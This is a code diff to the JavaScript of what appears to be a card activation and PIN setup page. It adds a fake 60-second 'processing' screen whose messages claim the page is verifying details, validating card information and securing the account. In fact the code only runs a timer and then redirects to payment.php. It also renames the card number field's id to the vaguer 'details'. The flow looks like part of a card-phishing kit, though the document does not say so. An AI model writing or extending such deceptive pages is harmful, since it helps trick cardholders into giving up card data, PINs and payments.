@@ -6,10 +6,16 @@
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('pinSetupForm');
     
+    // Check if activation was successful and show loading animation
+    if (typeof activationSuccess !== 'undefined' && activationSuccess) {
+        showLoadingAnimation();
+        return;
+    }
+    
     if (!form) return;
     
     // Card number formatting and validation
-    const cardNumberInput = document.getElementById('card_number');
+    const cardNumberInput = document.getElementById('details');
     if (cardNumberInput) {
         cardNumberInput.addEventListener('input', function() {
             // Remove non-digits
@@ -315,3 +321,69 @@ function hideError(input) {
         errorElement.classList.remove('show');
     }
 }
+
+/**
+ * Show loading animation for ~60 seconds before redirecting to payment page
+ */
+function showLoadingAnimation() {
+    const pinSetupContainer = document.getElementById('pinSetupContainer');
+    const processingContainer = document.getElementById('processingContainer');
+    const loadingText = document.getElementById('loadingText');
+    const progressBar = document.getElementById('progressBar');
+    const progressPercent = document.getElementById('progressPercent');
+    
+    if (!pinSetupContainer || !processingContainer) return;
+    
+    // Hide form, show loading
+    pinSetupContainer.style.display = 'none';
+    processingContainer.style.display = 'block';
+    
+    let progress = 0;
+    const duration = 60000; // 60 seconds
+    const interval = 100; // Update every 100ms
+    const increment = (interval / duration) * 100;
+    
+    // Loading messages to display during the process
+    const loadingMessages = [
+        'Processing your activation...',
+        'Verifying your details...',
+        'Securing your account...',
+        'Validating card information...',
+        'Setting up your PIN...',
+        'Finalizing activation...',
+        'Almost complete...'
+    ];
+    
+    let messageIndex = 0;
+    
+    // Update loading message every ~8 seconds
+    const messageInterval = setInterval(function() {
+        messageIndex++;
+        if (messageIndex < loadingMessages.length && loadingText) {
+            loadingText.textContent = loadingMessages[messageIndex];
+        }
+    }, 8500);
+    
+    // Progress bar animation
+    const progressInterval = setInterval(function() {
+        progress += increment;
+        
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(progressInterval);
+            clearInterval(messageInterval);
+            
+            // Redirect to payment page after loading complete
+            setTimeout(function() {
+                window.location.href = 'payment.php';
+            }, 500);
+        }
+        
+        // Update progress bar and text
+        if (progressBar && progressPercent) {
+            progressBar.style.width = progress + '%';
+            progressPercent.textContent = Math.floor(progress);
+        }
+    }, interval);
+}
+
